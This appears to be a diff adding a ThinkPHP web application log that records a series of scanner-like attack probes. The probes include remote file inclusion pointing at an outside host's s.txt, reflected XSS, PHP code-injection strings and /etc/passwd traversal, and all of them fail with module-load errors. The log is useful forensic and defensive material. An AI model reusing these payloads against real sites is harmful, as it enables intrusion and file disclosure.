+[ 2015-04-30T15:28:27+08:00 ] 121.42.0.15 /?m=http://112.124.36.187/s.txt&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000275s ]
+ERR: 无法加载模块:Http://112.124.36.187/s.txt
+
+[ 2015-04-30T15:28:32+08:00 ] 121.42.0.15 /?m=http%3A%2F%2F112.124.36.187%2Fs.txt&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000308s ]
+ERR: 无法加载模块:Http://112.124.36.187/s.txt
+
+[ 2015-04-30T15:28:40+08:00 ] 121.42.0.15 /?m=a_long_name_file_not_exist&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000411s ]
+ERR: 无法加载模块:A_long_name_file_not_exist
+
+[ 2015-04-30T15:28:46+08:00 ] 121.42.0.15 /?m=%27%22%3E%3CscRipt%3Ealert%2898733%29%3C%2FsCript%3E&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000344s ]
+ERR: 无法加载模块:'">alert(98733)
+
+[ 2015-04-30T15:29:06+08:00 ] 121.42.0.15 /?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2015-04-30T15:29:12+08:00 ] 121.42.0.15 /?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000257s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2015-04-30T15:29:19+08:00 ] 121.42.0.15 /?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000275s ]
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();/*
+
+[ 2015-04-30T15:33:22+08:00 ] 121.42.0.15 /?s=%2Fetc%2Fpasswd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
+ERR: 无法加载模块:Etc
+
+[ 2015-04-30T15:34:35+08:00 ] 121.42.0.15 /?s=http://112.124.36.187/s.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000261s ]
+ERR: 无法加载模块:Http:
+
+[ 2015-04-30T15:34:55+08:00 ] 121.42.0.15 /?s=http%3A%2F%2F112.124.36.187%2Fs.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000282s ]
+ERR: 无法加载模块:Http:
+
+[ 2015-04-30T15:34:57+08:00 ] 121.42.0.15 /?s=a_long_name_file_not_exist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000268s ]
+ERR: 无法加载模块:A_long_name_file_not_exist
+
+[ 2015-04-30T15:36:06+08:00 ] 121.42.0.15 /?s=%27%22%3E%3CscRipt%3Ealert%2898733%29%3C%2FsCript%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000287s ]
+ERR: 无法加载模块:'">alert(98733)
+
+[ 2015-04-30T15:36:53+08:00 ] 121.42.0.15 /?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000275s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2015-04-30T15:37:35+08:00 ] 121.42.0.15 /?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000330s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2015-04-30T15:37:37+08:00 ] 121.42.0.15 /?s=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000329s ]
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();
+
+[ 2015-04-30T15:42:57+08:00 ] 121.42.0.15 /index.php?s=%2Fetc%2Fpasswd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
+ERR: 无法加载模块:Etc
+
+[ 2015-04-30T15:43:09+08:00 ] 121.42.0.15 /index.php?s=http://112.124.36.187/s.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000257s ]
+ERR: 无法加载模块:Http:
+
+[ 2015-04-30T15:43:11+08:00 ] 121.42.0.15 /index.php?s=http%3A%2F%2F112.124.36.187%2Fs.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000267s ]
+ERR: 无法加载模块:Http:
+
+[ 2015-04-30T15:43:13+08:00 ] 121.42.0.15 /index.php?s=a_long_name_file_not_exist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000046s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000327s ]
+ERR: 无法加载模块:A_long_name_file_not_exist
+
+[ 2015-04-30T15:43:15+08:00 ] 121.42.0.15 /index.php?s=%27%22%3E%3CscRipt%3Ealert%2898733%29%3C%2FsCript%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000263s ]
+ERR: 无法加载模块:'">alert(98733)
+
+[ 2015-04-30T15:43:29+08:00 ] 121.42.0.15 /%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000262s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2015-04-30T15:43:30+08:00 ] 121.42.0.15 /index.php?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000347s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2015-04-30T15:43:32+08:00 ] 121.42.0.15 /index.php?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2015-04-30T15:43:35+08:00 ] 121.42.0.15 /index.php?s=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000277s ]
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();
+
+[ 2015-04-30T15:59:06+08:00 ] 116.204.86.124 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000273s ]
+ERR: 无法加载模块:Favicon
+
